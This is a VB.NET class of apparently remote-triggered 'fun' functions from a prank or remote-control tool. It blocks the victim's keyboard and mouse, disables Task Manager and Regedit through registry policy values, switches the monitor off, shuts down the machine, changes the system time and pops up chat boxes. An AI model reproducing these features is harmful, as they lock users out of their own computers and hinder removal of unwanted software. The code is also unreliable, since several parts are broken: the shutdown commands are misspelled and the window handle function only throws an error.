

Imports System.Runtime.InteropServices
Public Class FunFunktionen
#Region "Api, MonitorKlasse & Konstanten"
    Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrcommand As String) As Long
    <Runtime.InteropServices.DllImport("user32.dll", EntryPoint:="SendMessageA")> Private Shared Sub SendMessage(ByVal hWnd As IntPtr, ByVal uMsg As Int32, ByVal wParam As Int32, ByVal lParam As Int32)
    End Sub
    Private Enum Params As Int32
        SC_MONITORPOWER = &HF170    ' wParam
        WM_SYSCOMMAND = &H112       ' uMsg
        TURN_MONITOR_OFF = 2        ' Monitor ausschalten
        TURN_MONITOR_ON = -1        ' Monitor einschalten
    End Enum
    Private Structure SYSTEMTIME
        Public Year As Short
        Public Month As Short
        Public DayOfWeek As Short
        Public Day As Short
        Public Hour As Short
        Public Minute As Short
        Public Second As Short
        Public Milliseconds As Short
    End Structure
    Private Declare Function SetLocalTime Lib "kernel32.dll" (ByRef time As SYSTEMTIME) As Boolean

    Private Function Handle() As IntPtr
        Throw New NotImplementedException
    End Function
    Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    Const API_FALSE As Long = 0&
    Const API_TRUE As Long = 1&


#End Region
    Public Event ChatMSG(ByVal sText As String)
    Public Function CD_Laufwerk_öffnen() As Boolean
        Try
            mciExecute("Set CDaudio door open")
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function InputChatBox(ByVal titel As String, ByVal stext As String)
        Try
            Dim t As New System.Threading.Thread(AddressOf InputThread)
            t.IsBackground = True
            t.Start(New String() {stext, titel})
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Sub InputThread(ByVal sText() As String)
        Dim z As String = InputBox(sText(0), sText(1))
        If z <> "" Then
            RaiseEvent ChatMSG(z)
        End If
    End Sub


    Public Function TastaturMaus_Bloeckieren() As Boolean
        Try
            Call BlockInput(API_TRUE)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function DisableTaskmanager(ByVal b As Boolean)
        Try
            If b Then
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord)
            Else
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord)
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function DisableRegedit(ByVal b As Boolean)
        Try
            If b Then
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
            Else
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
            End If
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function TastaturMaus_Entblocken() As Boolean
        Try
            BlockInput(API_FALSE)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function CD_Laufwerk_schließen() As Boolean
        Try
            mciExecute("Set CDaudio door closed")
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function MonitorAusschalten() As Boolean
        Try
            SendMessage(Me.Handle, Params.WM_SYSCOMMAND, Params.SC_MONITORPOWER, Params.TURN_MONITOR_OFF)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function MonitorEinschalten() As Boolean
        Try
            SendMessage(Me.Handle, Params.WM_SYSCOMMAND, Params.SC_MONITORPOWER, Params.TURN_MONITOR_ON)
            Return True
        Catch ex As Exception
            Return False
        End Try

    End Function
    Public Function Runterfahren() As Boolean
        Try
            Shell("shutdown -s")
            Return True
        Catch ex As Exception
            Return False
        End Try

    End Function
    Public Function NeuStarten() As Boolean
        Try
            Shell("shudown -r")
            Return True
        Catch ex As Exception
            Return False
        End Try

    End Function
    Public Function Abmelden() As Boolean
        Try
            Shell("shudown -l")
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function WebseiteÖffnen(ByVal Link As String) As Boolean
        Try
            Process.Start(Link)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function SetTime(ByVal Jahr As Integer, ByVal Monat As Integer, ByVal Tag As Integer, ByVal Stunde As Integer, ByVal Minute As Integer, ByVal Sekunde As Integer, ByVal Millisekunde As Integer, ByVal DayofTheWeek As Object) As Boolean
        Try
            Dim _SystemTime As SYSTEMTIME = New SYSTEMTIME()
            _SystemTime.Day = Tag
            _SystemTime.DayOfWeek = DayofTheWeek
            _SystemTime.Hour = Stunde
            _SystemTime.Milliseconds = Millisekunde
            _SystemTime.Minute = Minute
            _SystemTime.Month = Monat
            _SystemTime.Second = Sekunde
            _SystemTime.Year = Jahr
            SetLocalTime(_SystemTime)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function



End Class


